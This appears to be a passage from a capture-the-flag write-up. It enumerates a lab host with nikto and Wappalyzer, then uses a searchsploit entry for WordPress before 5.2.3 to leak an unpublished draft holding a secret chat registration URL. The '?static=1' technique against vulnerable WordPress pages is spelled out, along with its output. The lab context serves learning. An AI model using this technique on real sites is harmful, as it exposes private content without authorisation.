### nikto results

Nikto revealed an interesting result:

`+ Uncommon header 'x-backend-server' found, with contents: office.paper`

We see that there is a backend server domain.

Note: the domain is not `office.paper.htb`

We need to add `office.paper` to our `/etc/hosts` file like so:

```
# etc hosts file

10.10.10.112   paper.htb office.paper
```

---

### enumerating office.paper

Wappalyzer tells us it is running `Wordpress 5.2.3`

---

### searchsploit

`searchsploit wordpress 5.2.3`

We look at this exploit:
```
xploit: WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts
      URL: https://www.exploit-db.com/exploits/47690
     Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.md
File Type: ASCII text
```

It states that adding `?static=1` to the end of the URL for vulnerable wp pages should leak secret content. We try this on `http://office.paper/index.php?static=1`

This reveals the following info:
```
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

we add `chat.office.paper` to our `/etc/hosts` file and visit the page.


---
